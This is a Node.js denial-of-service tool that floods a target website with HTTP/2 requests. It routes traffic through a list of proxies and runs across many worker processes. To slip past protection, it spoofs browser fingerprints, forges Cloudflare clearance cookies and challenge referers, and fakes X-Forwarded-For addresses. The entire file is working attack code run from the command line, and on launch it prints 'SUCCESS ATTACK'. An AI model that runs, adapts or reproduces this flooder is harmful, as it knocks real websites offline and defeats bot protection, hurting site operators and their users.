const url = require('url')
	, fs = require('fs')
	, http2 = require('http2')
	, http = require('http')
	, tls = require('tls')
	, net = require('net')
	, request = require('request')
	, cluster = require('cluster')
const ua = require('user-agents');
const crypto = require('crypto');
const currentTime = new Date();
const httpTime = currentTime.toUTCString();
const errorHandler = error => {
	//console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
try {
	var colors = require('colors');
} catch (err) {
	console.log('\x1b[36mInstalling\x1b[37m the requirements');
	execSync('npm install colors');
	console.log('Done.');
	process.exit();
}
const fetch_site = [
	"same-origin"
	, "same-site"
	, "cross-site"
	, "none"
];
const type = [
	"text/plain"
	, "text/html"
	, "application/json"
	, "application/xml"
	, "multipart/form-data"
	, "application/octet-stream"
	, "image/jpeg"
	, "image/png"
	, "audio/mpeg"
	, "video/mp4"
	, "application/javascript"
	, "application/pdf"
	, "application/vnd.ms-excel"
	, "application/vnd.ms-powerpoint"
	, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
	, "application/vnd.openxmlformats-officedocument.presentationml.presentation"
	, "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
	, "application/zip"
	, "image/gif"
	, "image/bmp"
	, "image/tiff"
	, "audio/wav"
	, "audio/midi"
	, "video/avi"
	, "video/mpeg"
	, "video/quicktime"
	, "text/csv"
	, "text/xml"
	, "text/css"
	, "text/javascript"
	, "application/graphql"
	, "application/x-www-form-urlencoded"
	, "application/vnd.api+json"
	, "application/ld+json"
	, "application/x-pkcs12"
	, "application/x-pkcs7-certificates"
	, "application/x-pkcs7-certreqresp"
	, "application/x-pem-file"
	, "application/x-x509-ca-cert"
	, "application/x-x509-user-cert"
	, "application/x-x509-server-cert"
	, "application/x-bzip"
	, "application/x-gzip"
	, "application/x-7z-compressed"
	, "application/x-rar-compressed"
	, "application/x-shockwave-flash"
];
const platform = [
	"Windows"
	, "Windows Phone"
	, "Macintosh"
	, "Linux"
	, "iOS"
	, "Android"
	, "PlayStation 4"
	, "Xbox One"
	, "Nintendo Switch"
	, "Apple TV"
	, "Amazon Fire TV"
	, "Roku"
	, "Chromecast"
	, "Smart TV"
	, "Other"
];
cplist = [
		'TLS_AES_128_CCM_8_SHA256',
		'TLS_AES_128_CCM_SHA256',
		'TLS_CHACHA20_POLY1305_SHA256',
		'TLS_AES_256_GCM_SHA384',
		'TLS_AES_128_GCM_SHA256'
		, ]
const lang_header = [
	'en-US,en;q=0.9'
	, 'en-GB,en;q=0.9'
	, 'en-CA,en;q=0.9'
	, 'en-AU,en;q=0.9'
	, 'en-NZ,en;q=0.9'
	, 'en-ZA,en;q=0.9'
	, 'en-IE,en;q=0.9'
	, 'en-IN,en;q=0.9'
	, 'ar-SA,ar;q=0.9'
	, 'az-Latn-AZ,az;q=0.9'
	, 'be-BY,be;q=0.9'
	, 'bg-BG,bg;q=0.9'
	, 'bn-IN,bn;q=0.9'
	, 'ca-ES,ca;q=0.9'
	, 'cs-CZ,cs;q=0.9'
	, 'cy-GB,cy;q=0.9'
	, 'da-DK,da;q=0.9'
	, 'de-DE,de;q=0.9'
	, 'el-GR,el;q=0.9'
	, 'es-ES,es;q=0.9'
	, 'et-EE,et;q=0.9'
	, 'eu-ES,eu;q=0.9'
	, 'fa-IR,fa;q=0.9'
	, 'fi-FI,fi;q=0.9'
	, 'fr-FR,fr;q=0.9'
	, 'ga-IE,ga;q=0.9'
	, 'gl-ES,gl;q=0.9'
	, 'gu-IN,gu;q=0.9'
	, 'he-IL,he;q=0.9'
	, 'hi-IN,hi;q=0.9'
	, 'hr-HR,hr;q=0.9'
	, 'hu-HU,hu;q=0.9'
	, 'hy-AM,hy;q=0.9'
	, 'id-ID,id;q=0.9'
	, 'is-IS,is;q=0.9'
	, 'it-IT,it;q=0.9'
	, 'ja-JP,ja;q=0.9'
	, 'ka-GE,ka;q=0.9'
];
const country = [
	"A1", "A2", "O1", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AO", "AQ", "AR", "AS", "AT", "AU"
	, "AW", "AX", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BL", "BM", "BN", "BO"
	, "BQ", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC", "CD", "CF", "CG", "CH", "CI", "CK"
	, "CL", "CM", "CN", "CO", "CR", "CU", "CV", "CW", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO"
	, "DZ", "EC", "EE", "EG", "EH", "ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "GA", "GB"
	, "GD", "GE", "GF", "GG", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT", "GU", "GW"
	, "GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IM", "IN", "IO", "IQ", "IR", "IS"
	, "IT", "JE", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM", "KN", "KP", "KR", "KW", "KY", "KZ"
	, "LA", "LB", "LC", "LI", "LK", "LR", "LS", "LT", "LU", "LV", "LY", "MA", "MC", "MD", "ME", "MF"
	, "MG", "MH", "MK", "ML", "MM", "MN", "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX"
	, "MY", "MZ", "NA", "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA"
	, "PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY", "QA", "RE", "RO"
	, "RS", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SJ", "SK", "SL", "SM", "SN"
	, "SO", "SR", "SS", "ST", "SV", "SX", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TL"
	, "TM", "TN", "TO", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC"
	, "VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "ZA", "ZM", "ZW"
];
const fetch_mode = [
	"navigate"
	, "same-origin"
	, "no-cors"
	, "cors"
, ];
const fetch_dest = [
	"document"
	, "sharedworker"
	, "subresource"
	, "unknown"
	, "worker"
, ];
encoding_header = [
	'gzip, deflate, br'
	, 'compress, gzip'
	, 'deflate, gzip'
	, 'gzip, identity'
];
const sigalgs = [
	'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512'
	, 'ecdsa_brainpoolP256r1tls13_sha256'
	, 'ecdsa_brainpoolP384r1tls13_sha384'
	, 'ecdsa_brainpoolP512r1tls13_sha512'
	, 'ecdsa_sha1'
	, 'ed25519'
	, 'ed448'
	, 'ecdsa_sha224'
	, 'rsa_pkcs1_sha1'
	, 'rsa_pss_pss_sha256'
	, 'dsa_sha256'
	, 'dsa_sha384'
	, 'dsa_sha512'
	, 'dsa_sha224'
	, 'dsa_sha1'
	, 'rsa_pss_pss_sha384'
	, 'rsa_pkcs1_sha2240'
	, 'rsa_pss_pss_sha512'
	, 'sm2sig_sm3'
	, 'ecdsa_secp521r1_sha512'
, ];
let concu = sigalgs.join(':');
controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
	, ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
	, ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
	 lang() {
		return lang_header[Math.floor(Math.random() * lang_header.length)];
	}
	, encoding() {
		return encoding_header[Math.floor(Math.random() * encoding_header.length)];
	}
	, controling() {
		return controle_header[Math.floor(Math.random() * controle_header.length)];
	}
	, cipher() {
		return cplist[Math.floor(Math.random() * cplist.length)];
	}
	, referers() {
		return referer[Math.floor(Math.random() * referer.length)]
	}
	, platforms() {
		return platform[Math.floor(Math.random() * platform.length)]
	}
	, mode() {
		return fetch_mode[Math.floor(Math.random() * fetch_mode.length)]
	}
	, dest() {
		return fetch_dest[Math.floor(Math.random() * fetch_dest.length)]
	}
	, site() {
		return fetch_site[Math.floor(Math.random() * fetch_site.length)]
	}
	, countrys() {
		return country[Math.floor(Math.random() * country.length)]
	}
	, type() {
		return type[Math.floor(Math.random() * type.length)]
	}
, }


function randomIp() {
	const segment1 = Math.floor(Math.random() * 256);
	const segment2 = Math.floor(Math.random() * 256);
	const segment3 = Math.floor(Math.random() * 256);
	const segment4 = Math.floor(Math.random() * 256);
	return `${segment1}.${segment2}.${segment3}.${segment4}`;
}
process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];
let input = process.argv[7]
if (!target || !time || !thread || !proxyFile || !rps || !input) {
	console.error(`Example: node ${process.argv[1]} url time thread proxy.txt rps bypass/flood`);

	process.exit(1);
}
if (!/^https?:\/\//i.test(target)) {
	console.error(' SEND WITH HTTPS:// '.bgRed);
	process.exit(1);
}
let proxys = [];
try {
	const proxyData = fs.readFileSync(proxyFile, 'utf-8');
	proxys = proxyData.match(/\S+/g);
} catch (err) {
	console.error(' Error proxy file '.bgRed)
	, console.log(`Reason: `.red, err.message)
	process.exit(1);
}
if (isNaN(rps) || rps <= 0) {
	console.error(' Number RPS '.bgRed);
	process.exit(1);
}
const proxyr = () => {
	return proxys[Math.floor(Math.random() * proxys.length)];
}
if (cluster.isMaster) {
	console.clear()
	console.log(` SUCCESS ATTACK `.bgGreen)
	, console.log(` `.yellow)
	, console.log(`TARGET: ${process.argv[2]}`)
	, console.log(`TIME: ${process.argv[3]}`)
	, console.log(`THREAD: ${process.argv[4]}`)
	, console.log(`PROXYFILE: ${process.argv[5]}`)
	, console.log(`RPS: ${process.argv[6]}`)
	, console.log(` `.yellow)
	for (let counter = 1; counter <= thread; counter++) {
		cluster.fork();
	}
	setTimeout(() => process.exit(-1), time * 1000);
} else {
	setInterval(flood)
}

function flood() {
	var parsed = url.parse(target);
	var cipper = headerFunc.cipher();
	var proxy = proxyr().split(':');
	var randIp = randomIp();
	let interval

	if (input === 'flood') {
	  interval = 1000;
	} else if (input === 'bypass') {
	  function randomDelay(min, max) {
		return Math.floor(Math.random() * (max - min + 1)) + min;
	  }
  
	  interval = randomDelay(1000, 5000);
	} else {
	  interval = 1000;
	}
  
  
	  
	const mediaTypes = [
		'text/html'
		, 'application/xhtml+xml'
		, 'application/xml'
		, 'image/avif'
		, 'image/webp'
		, 'image/apng'
		, '/'
		, 'application/signed-exchange'
	];
	const acceptValues = [];
	mediaTypes.forEach((type, index) => {
		const quality = index === 0 ? 1 : (Math.random() * 0.9 + 0.1).toFixed(1);
		acceptValues.push(`${type};q=${quality}`);
	});
	const acceptHeader = acceptValues.join(',');
	  
	const operatingSystems = ["Windows NT 10.0", "Macintosh", "X11"];
	const architectures = {
	  "Windows NT 10.0": "Win64; x64",
	  "Macintosh": "Intel Mac OS X 13_5_1",
	  "X11": "Linux x86_64; rv:109.0"
	};
	const browsers = [
	  "Chrome/116.0.0.0 Safari/537.36",
	  "Version/16.5 Safari/605.1.15",
	  "Chrome/116.0.0.0 Safari/537.36 Edg/115.0.1901.203", 
	  "Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0" 
	];
	const xv = {
		"Chrome/116.0.0.0 Safari/537.36":'AppleWebKit/537.36 (KHTML, like Gecko)',
		"Version/16.5 Safari/605.1.15":'AppleWebKit/537.36 (KHTML, like Gecko)',
		"Chrome/116.0.0.0 Safari/537.36 Edg/115.0.1901.203":'AppleWebKit/537.36 (KHTML, like Gecko)',
		"Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0": 'AppleWebKit/537.36 (KHTML, like Gecko)'
	}
	const sec1 = {
		"Chrome/116.0.0.0 Safari/537.36 Edg/115.0.1901.203":'"Microsoft Edge";v="116"',
		"Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0":'"Opera GX";v="100"',
		"Chrome/116.0.0.0 Safari/537.36" :'"Google Chrome";v="116"',
		"Version/16.5 Safari/605.1.15": '"Safari";v="15.0.0", "Chrome";v="116"'
}
const sec2 = {
	'Windows NT 10.0':'Windows',
	'Macintosh':'macOS',
	'X11':'Linux'
}
const ver2 = {
'X11' : '11',
'Macintosh': '13',
'Windows NT 10.0' : '10'}
	function getRandomValue(arr) {
	  const randomIndex = Math.floor(Math.random() * arr.length);
	  return arr[randomIndex];
	}
	
	const randomOS = getRandomValue(operatingSystems);
	const randomArch = architectures[randomOS]; 
	const randomBrowser = getRandomValue(browsers);
	const brand = sec1[randomBrowser]
	const randomxv = xv[randomBrowser]
	const uas = `Mozilla/5.0 (${randomOS};${randomArch}) ${randomxv} ${randomBrowser}`;
    const secua = `"Chromium";v="116", "Not)A;Brand";v="24", ${brand}`
    const spoof = sec2[randomOS]
    const ver = ver2[randomOS]
   function generateRandomString(minLength, maxLength) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  let result = '';

  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    result += characters[randomIndex];
  }

  return result;
}

	  function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
	
	function randstrs(length) {
		const characters = "0123456789";
		const charactersLength = characters.length;
		const randomBytes = crypto.randomBytes(length);
		let result = "";
		for (let i = 0; i < length; i++) {
			const randomIndex = randomBytes[i] % charactersLength;
			result += characters.charAt(randomIndex);
		}
		return result;
	}
	const randstrsValue = randstrs(10);
	
	function randstrr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
	/*
	var header = {
		':authority': parsed.host
		,':method': 'PATCH'
		, ':path': parsed.path
		//https://shitflare.asia/?__cf_chl_tk=jgKzlOa2fpMD1gJFTMtIa5N7.pq59eV_WgLPDjvvFp0-1692617951-0-gaNycGzNCns
		//https://shitflare.asia/?__cf_chl_tk=dkUf_Sr9YhHnH700sTFW01Rlvij2.ZdLnUd8ULgMp8w-1692618380-0-gaNycGzNKrs
		, ':scheme': 'https'
		//, 'Alt-Used' : parsed.host
		//,'Connection' : 'close'
	   // , 'x-forwarded-proto':'https'
		, 'accept': acceptHeader
		, 'accept-encoding': headerFunc.encoding()
		, 'accept-language': headerFunc.lang()
		, 'cache-control': 'max-age=0'
		, 'cookie': "cf_clearance=" +randstr(43) +"-" +randstrsValue +"-0-1-" +randstr(8) +"." +randstr(8) +"." +randstr(8) +"-" +randstrs(3) +"." +"2" +"." +randstrsValue
		,'If-Modified-Since': httpTime 
		//,'referer': target
		, 'sec-ch-ua': selectedValue
		, 'sec-ch-ua-mobile': '?0'
		, 'sec-ch-ua-platform': 'Linux'
		, 'sec-fetch-dest': headerFunc.dest()
		, 'sec-fetch-mode': headerFunc.mode()
		, 'sec-fetch-site': headerFunc.site()
		, 'sec-fetch-user': '?1'
		//, 'te': 'trailers'
		, 'upgrade-insecure-requests': '1'
		, 'user-agent':uas
		//, 'origin': target 
		//, 'x-forwarded-for': randIp
		//, 'x-requested-with': 'XMLHttpRequest'
		//, 'content-type': headerFunc.type()
	, };*/

	
	 header = {
		':method': 'GET'
		, ':path': parsed.path + '?' + generateRandomString(5, 10) + '=' + generateRandomString(10, 20)
		, ':scheme': 'https'
		, ':authority': parsed.host
    , 'x-forwarded-proto':'https'
		, 'accept': acceptHeader
		, 'accept-encoding': headerFunc.encoding()
		, 'accept-language': headerFunc.lang()
		, 'cache-control': headerFunc.controling()
    , 'content-type': 'application/x-www-form-urlencoded'
		, 'cookie': "cf_clearance=" +randstr(43) +"-" +randstrsValue +"-0-1-" +randstr(8) +"." +randstr(8) +"." +randstr(8) +"-" +randstrs(3) +"." +"2" +"." +randstrsValue
		, 'Date': httpTime
    , 'If-Modified-Since': httpTime 
		, 'referer': target + '?__cf_chl_tk=' + randstrr(24) + '.' + randstrr(19) + '-' + randstrsValue + '-0-' + 'gaNy'+randstrr(8)   
		, 'sec-ch-ua': secua
		, 'sec-ch-ua-mobile': '?0'
		, 'sec-ch-ua-platform': spoof
		, 'sec-ch-ua-platform-version':ver
		, 'sec-fetch-dest': 'document'
		, 'sec-fetch-mode': 'navigate'
		, 'sec-fetch-site': 'same-origin'
		, 'sec-fetch-user': '?1'
    , 'Sec-CH-UA-Bitness' : '64'
		, 'te': 'trailers'
		, 'upgrade-insecure-requests': '1'
		, 'user-agent':uas
    , 'origin': target 
		, 'x-forwarded-for': randIp
		, 'Pragma': headerFunc.controling()
    , 'x-requested-with': 'XMLHttpRequest'
	, };
	const agent = new http.Agent({
		host: proxy[0]
		, port: proxy[1]
		, keepAlive: true
		, keepAliveMsecs: 500000000
		, maxSockets: 50000
		, maxTotalSockets: 100000
	, });
	const Optionsreq = {
		agent: agent
		, method: 'CONNECT'
		, path: parsed.host + ':443'
		, timeout: 5000
		, headers: {
			'Host': parsed.host
			, 'Proxy-Connection': 'Keep-Alive'
			, 'Connection': 'Keep-Alive'
		, }
	, };
	connection = http.request(Optionsreq, (res) => {});
	const TLSOPTION = {
		ciphers: cipper
		, secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"]
		, sigals: concu
		, secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom
		, echdCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448"
		, secure: true
		, Compression: false
		, rejectUnauthorized: false
		, ALPNProtocols: ['h2']
	, };

	function createCustomTLSSocket(parsed, socket) {
		const tlsSocket = tls.connect({
			...TLSOPTION
			, host: parsed.host
			, port: 443
			, servername: parsed.host
			, socket: socket
		});
		tlsSocket.setKeepAlive(true, 600000 * 1000);
		  
		return tlsSocket;
	}
	function generateJA3Fingerprint(socket) {
		const cipherInfo = socket.getCipher();
		const supportedVersions = socket.getProtocol();
	  
		if (!cipherInfo) {
		  console.error('Cipher info is not available. TLS handshake may not have completed.');
		  return null;
		}
	  
		const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
	  
		const md5Hash = crypto.createHash('md5');
		md5Hash.update(ja3String);
	  
		return md5Hash.digest('hex');
	  }	  
	  
 
	 
	connection.on('connect', function(res, socket) {
		
    socket.setKeepAlive(true, 100000);
		const tlsSocket = createCustomTLSSocket(parsed, socket);
let ja3Fingerprint; 


function getJA3Fingerprint() {
    return new Promise((resolve, reject) => {
        tlsSocket.on('secureConnect', () => {
            ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
            resolve(ja3Fingerprint); 
        });

        
        tlsSocket.on('error', (error) => {
            reject(error); 
        });
    });
}

async function main() {
    try {
        const fingerprint = await getJA3Fingerprint();    
        header['ja3'] = fingerprint;
    } catch (error) {
        
    }
}


main();
	const client = http2.connect(parsed.href, {
			createConnection: () => tlsSocket
			, settings: {
				headerTableSize: 65536
				, maxConcurrentStreams: 1000
				, initialWindowSize: 6291456
				, maxHeaderListSize: 262144
				, enablePush: false
			}
		});
		client.on("connect", () => {
			setInterval(() => {
				for (let i = 0; i < rps; i++) {
					const request = client.request(header)
                        request.end()
				}
			}, interval);
		});
		  
		client.on("close", () => {
			client.desstroy();
			tlsSocket.desstroy();
			socket.destroy();
			return
		});
client.on("error", error => {
    if (error.code === 'GOAWAY') {
        console.log('Received GOAWAY error, pausing requests for 10 seconds\r');
        shouldPauseRequests = true;
        setTimeout(() => {
            console.log('Resuming requests after 10 seconds\r');
            shouldPauseRequests = false;
        },2000);
    } else if (error.code === 'ECONNRESET') {
        //console.log('Connection reset by peer. Pausing requests for a while\r');
        shouldPauseRequests = true;
        setTimeout(() => {
            //console.log('Resuming requests after a short delay\r');
            shouldPauseRequests = false;
        }, 2000);
    }  else {
        const statusCode = error.response ? error.response.statusCode : null;

        if (statusCode >= 520 && statusCode <= 529) {
            console.log(`HTTP Error ${statusCode} in the range 520-529. Pausing requests for a while\r`);
            shouldPauseRequests = true;
            setTimeout(() => {
               // console.log('Resuming requests after a short delay\r');
                shouldPauseRequests = false;
            }, 2000);
        } else if (statusCode >= 531 && statusCode <= 539) {
            console.log(`HTTP Error ${statusCode} in the range 531-539. Handling this error\r`);
            setTimeout(() => {
               // console.log('Resuming requests after a short delay\r');
                shouldPauseRequests = false;
            }, 2000);
        } else {
           // console.error('An unexpected error occurred:', error);
        }
    }

    // Close the client, TLS socket, and socket if needed
    client.desstroy()
    tlsSocket.desstroy();
    socket.destroy();
});

	});


	connection.on('error', (error) => {
		connection.destroy();
		if (error) return;
	});
	connection.on('timeout', () => {
		connection.destroy();
		return
	});
	connection.end();
}
